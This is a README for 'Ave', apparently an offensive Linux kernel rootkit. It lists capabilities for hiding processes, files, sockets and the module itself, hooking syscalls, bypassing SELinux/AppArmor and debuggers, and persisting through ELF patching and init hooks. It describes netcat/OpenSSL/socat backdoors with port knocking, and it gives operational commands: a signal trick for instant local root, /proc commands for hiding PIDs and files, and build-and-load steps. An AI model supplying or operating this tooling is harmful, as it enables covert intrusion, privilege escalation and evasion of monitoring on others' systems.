<h2 align="center">[Overview]</h2>


Ave is a loadable Linux kernel module (5.18+) capable of hiding processes, files, and connected sockets at the kernel level, plus substituting system calls and encrypting traffic. It runs on x86-64 and ARM64. In short, it’s a universal tool for stealthily concealing any objects in the system, with extra features for bypassing SELinux/AppArmor, anti-debugging, and a whole set of other functions.

*Key capabilities:*
- **Kernel-level cloaking** — removes traces from `lsmod`, `/proc`, `/sys`, `ps`, `top`, etc.  
- **File & directory hiding** — `filldir`/`filldir64` hooks suppress listings.  
- **Dynamic syscall substitution** — live patching of `read`, `kill`, `clone`. 
- **Encrypted networking** — Netfilter-based AES tunnel with signature obfuscation.  
- **Anti-debug & hardening bypass** — blocks `ptrace/strace`, skirts `RELRO/PIE/NX`.  
- **Persistence** — ELF patching & init-system hooks for auto-start.

## Installation:
### 1. Prerequisites
To build Ave, first install the packages:

```bash
sudo apt install cmake gcc g++ llvm-dev llvm-tools python3-pip qemu-system-x86 socat netcat libssl-dev
pip3 install lit
sudo ln -s ~/.local/bin/lit /usr/bin/llvm-lit
````

### 2. Building

#### Local build

1. Prepare a folder for builds:

   ```bash
   mkdir build && cd build
   cmake ../ -DCMAKE_C_COMPILER=gcc -DPROCNAME="interface_name"
   ```

2. Start the build:

   ```bash
   make
   ```

#### Cross-compilation

If you need to build for another kernel or another machine:

```bash
cmake ../ -DKERNEL_DIR=/path/to/kernel/headers -DKOVID_LINUX_VERSION=5.10 -DCMAKE_C_COMPILER=gcc
make
```

## Main Functionality:

### 1. Module masking

Ave removes itself from `lsmod`, `/sys`, and other places where the module is normally visible. In **DEPLOY** mode all this works out of the box.

### 2. Hiding files and directories

Uses the `filldir` and `filldir64` hooks:

* Everything that’s hidden vanishes from `ls`, `ps`, `top`, etc.
* No traces in standard utilities.

### 3. System calls

A mix of **Ftrace** hooks and direct editing of the system-call table:

* Dynamically updates hooks as the kernel changes.
* Replaces, for example, `read`, `kill`, `clone`, etc.

### 4. Working with the network stack

Through **netfilter** Ave controls connections and generates hidden signatures. Everything is encrypted with AES.

### 5. Bypassing kernel protections

SELinux, AppArmor, and the `relro`, `pie`, `nx` protections are bypassed, adapting to the specific system configuration.

### 6. Anti-debug

* Filters and blocks `ptrace`, `strace`, and other debuggers.
* Data in memory is encrypted to resist dumping and analysis.
* On debugging attempts the module starts substituting information.

### 7. Persistence

* Patches ELF files for autoload.
* Fixes itself in system init mechanisms so it starts at boot.

### 8. Backdoors

Choose from:

* **Netcat:** uses port knocking for remote hidden access.
* **OpenSSL:** to immediately have an encrypted channel.
* **Socat:** universal, for any socket type.

### 9. Logs

* Removes traces from `dmesg`.
* Masks TCP/UDP connections.
* Hides itself from `/proc`.

## Usage:

### Enable the /proc interface

```bash
kill -SIGCONT 31337
```

After that `/proc/interface_name` starts listening for your commands.

### Gain root

```bash
kill -SIGCONT 666
su      # automatic local privilege escalation
```

### Hide a process

```bash
echo <PID> > /proc/interface_name
```

### Hide files and folders

* In the current directory:

  ```bash
  echo hide-file=README.txt > /proc/interface_name
  ```

* By absolute path:

  ```bash
  echo hide-directory=/home/user/docs > /proc/interface_name
  ```

### Backdoors

To check which backdoors are available:

```bash
utils/bd_connect.sh
```

## Technical Details:

### Architecture

* x86-64 and ARM64 are the main focus.
* Kernels: 5.18+.
* Automatically adapts to kernel settings so hooks don’t break after updates.

### Security

* Completely removes hidden processes and connections from monitoring.
* The module blocks unloading and, if tampered with, tries to back itself up.

### Automation

* Scripts for quick build and deployment of the rootkit.
* Key generation for encrypted channels.
* Modular infection machinery for ELF files autoconnect.

## Testing:

Tested on:

* **Debian 12.8 (Bookworm):** kernel 6.1.0-10-amd64 (LTS).
* **Ubuntu 22.04.3 LTS:** kernel 5.19.0-32-generic (HWE).
* **Ubuntu 23.10:** kernel 6.5.0-25-generic.

### Running tests

1. Local tests:

   ```bash
   make check-ave -j1
   ```

2. Cross-tests:

   ```bash
   cmake ../ -DKERNEL_DIR=/path/to/kernel/headers -DCROSS_TESTS=ON
   make check-ave
   ```


## Build
The Makefile relies on the kernel **Kbuild** system at `/lib/modules/$(uname -r)/build`.  
Building produces `ave.ko`, a kernel module you can load with:

```bash
sudo insmod ave.ko
````

and verify with:

```bash
lsmod | grep ave
```

## Makefile Targets

| Target            | Description                                                                          |
| ----------------- | ------------------------------------------------------------------------------------ |
| **all** (default) | Builds `ave.ko`. **Requires** `PROCNAME=<name>` to set the `/proc/<PROCNAME>` entry. |
| **injection**     | Builds the `injection` binary from `injection.S` for the protection logic.           |
| **strip**         | Strips debug symbols from `ave.ko`.                                                  |
| **reset-auto**    | Clears generated keys in the sources.                                                |
| **clean**         | Removes object files and resets keys, returning the project to a clean state.        |
| **lgtm**          | Runs `injection` first, then builds the module.                                      |

---

## Notes

* With `DEPLOY=1`, the build is made without debugging.
* `TEST_ENV` uses fixed test keys.
* `BDKEY` and `UNHIDEKEY` are randomly generated by default (you can set them manually or enable the test environment).

## Step-by-Step (Ubuntu)

1. Install packages:

   ```bash
   sudo apt update
   sudo apt install build-essential linux-headers-$(uname -r) \
                    ctags uuid-runtime
   ```

2. Go to the source directory:

   ```bash
   cd /home/user/ave
   ```

3. Build with a `PROCNAME`:

   ```bash
   make PROCNAME=hidden
   # or without debugging:
   DEPLOY=1 make PROCNAME=hidden
   ```

4. Check that `ave.ko` exists:

   ```bash
   ls -l ave.ko
   ```

5. Load the module:

   ```bash
   sudo insmod ave.ko
   lsmod | grep ave
   # then check /proc/hidden
   ```

6. Build `injection`:

   ```bash
   make injection
   ```

7. Additional targets:

   * `make strip` — remove debug symbols from `ave.ko`.
   * `make lgtm` — run `injection`, then build.

8. Clean up:

   ```bash
   make clean
   ```
